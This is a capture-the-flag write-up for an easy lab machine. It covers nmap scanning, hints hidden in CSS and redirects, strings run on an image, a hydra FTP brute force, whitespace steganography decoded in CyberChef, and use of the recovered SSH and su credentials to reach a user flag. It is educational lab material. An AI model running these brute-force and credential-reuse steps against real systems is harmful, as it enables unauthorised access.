# Write-up : "Musa Troglodytarum"

**Target:** 10.10.0.X (vhost `viridiancity.epi`, the IP changes on every redeploy)

**Objective:** Get user.txt

**Difficulty:** Easy

**Date:** 21/09/2026

**Techniques:** web enumeration, hint hidden in CSS, HTTP redirection, directory listing, `strings` on an image, FTP brute force, space/tab steganography, credential reuse, pivot between users

**Tools:** nmap, curl, wget, strings, hydra, ftp, ssh, CyberChef

---

## 1. Port scan

```bash
nmap -sV 10.10.0.X
```

Result: `21` (FTP), `22` (SSH), `80` (HTTP, "It works" page).

We add the site name:

```bash
echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
```
This line tells your machine: "viridiancity.epi = this IP". `tee -a` = append to the end of the `/etc/hosts` file.

---

## 2. A hint hidden in the CSS

The home page talks about a "video": it's a trap, we ignore it. The real hint is in the stylesheet:

```bash
curl http://viridiancity.epi/assets/style.css
```

At the bottom, a comment:

```
Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
```

**Vulnerability:** sensitive info left in a secondary file (CWE-200).

---

## 3. Following the hidden page

```bash
curl -i http://viridiancity.epi/l3_B4n4N13r_D3s_M0nT4gN3s.php
```
`-i` = displays the headers. The empty page returns a redirect.

The `Location:` header reveals a hidden folder:
`/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`

**Vulnerability:** unprotected "secret" path (CWE-425).

---

## 4. Retrieving the hidden image

Open the folder in your browser (or with curl):

```bash
curl http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
```

It contains `Hot_Babe.png`. Download it:

```bash
wget http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png
```

**Vulnerability:** directory listing enabled (CWE-548).

---

## 5. Reading the hidden text in the image

```bash
strings Hot_Babe.png
```
`strings` displays the readable text of a file.

At the very bottom:

```
Username for FTP is banane_celeste
One of these is the password:
(200 passwords)
```

Copy the password list into a `passwords.txt` file (copy-paste, or with an editor).

**Vulnerability:** login and passwords hidden in an image (CWE-200).

---

## 6. FTP brute force

```bash
hydra -l banane_celeste -P passwords.txt -f ftp://10.10.0.X
```
`-l` = the login, `-P` = the list, `-f` = stops as soon as it finds one.

Hydra displays the correct FTP password.

**Vulnerability:** no protection against brute force (CWE-307).

---

## 7. Connecting to FTP and grabbing the file

```bash
ftp 10.10.0.X
```
Then in the FTP session:
```
Name: banane_celeste
Password: <the password found>
ls
get Valerian's_Creds.txt
bye
```
`ls` lists, `get` downloads, `bye` quits.

Look at the file:
```bash
cat -A Valerian's_Creds.txt
```
`cat -A` shows the tabs `^I` and spaces: the file is full of whitespace, it's a hidden message.

---

## 8. Decoding the space/tab steganography with CyberChef

The content is hidden binary: space = 0, tab = 1, 8 bits = 1 letter.
No need to code, we use CyberChef ([cyberchef.io](https://cyberchef.io)):

1. Paste the content of `Valerian's_Creds.txt` into Input.
2. In the recipe, drag in:
   - Find / Replace: search `\t` (Regex mode), replace with `1`
   - Find / Replace: search ` ` (a space), replace with `0`
   - From Binary
3. The result shows up in Output:

```
User: valerian
Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
```

**Vulnerability:** credentials hidden by steganography (CWE-311).

---

## 9. SSH connection as valerian

```bash
ssh valerian@10.10.0.X
```
(password: `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)

The welcome message says: "check our s3cr3t hiding place", it's a hint.

**Vulnerability:** reuse of exposed credentials (CWE-522).

---

## 10. Finding the hiding place

`user.txt` isn't in the home directory. We look for the "hiding place":

```bash
find / -iname "*s3cr3t*" 2>/dev/null
```
`find` searches everywhere; `2>/dev/null` hides permission errors.

Result: `/usr/games/s3cr3t/`. It contains a hidden file:

```bash
cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```

Message:

```
... just a reminder ... "ca_serait_jamais_arrive_en_haskell" ...
   -Valerian
```

Gabriel's password: `ca_serait_jamais_arrive_en_haskell`

**Vulnerability:** plaintext password in a file (CWE-256).

---

## 11. Becoming gabriel and reading the flag

```bash
su gabriel
```
(password: `ca_serait_jamais_arrive_en_haskell`)

```bash
cat ~/user.txt
```

**FLAG:** `EPI{...}` (replace with your value)

---

## Summary of steps

1. CSS comment: the `.php` page.
2. That page (302): a hidden folder.
3. The folder contains `Hot_Babe.png`.
4. `strings` on the image: FTP login and password list.
5. `hydra`: the FTP password.
6. FTP: `Valerian's_Creds.txt` (spaces/tabs).
7. CyberChef: valerian's password.
8. SSH valerian, hidden message: gabriel's password.
9. `su gabriel`: `user.txt`.

## Exploited vulnerabilities

| # | Vulnerability | CWE |
|---|--------|-----|
| 1 | Hint in a CSS comment | CWE-200 |
| 2 | Unprotected secret path | CWE-425 |
| 3 | Directory listing enabled | CWE-548 |
| 4 | Login and wordlist hidden in an image | CWE-200 |
| 5 | No FTP anti-brute-force | CWE-307 |
| 6 | Whitespace stego | CWE-311 |
| 7 | Credential reuse | CWE-522 |
| 8 | Plaintext password in a file | CWE-256 |

## Key takeaways
- Always read secondary files (CSS, comments): the hint was there.
- A `curl` that shows nothing = a redirect, redo it with `-i`.
- `strings` reveals text hidden in an image.
- A file full of spaces/tabs is binary: CyberChef (space=0, tab=1, From Binary), no code needed.
- The "video" is a deliberate trap.
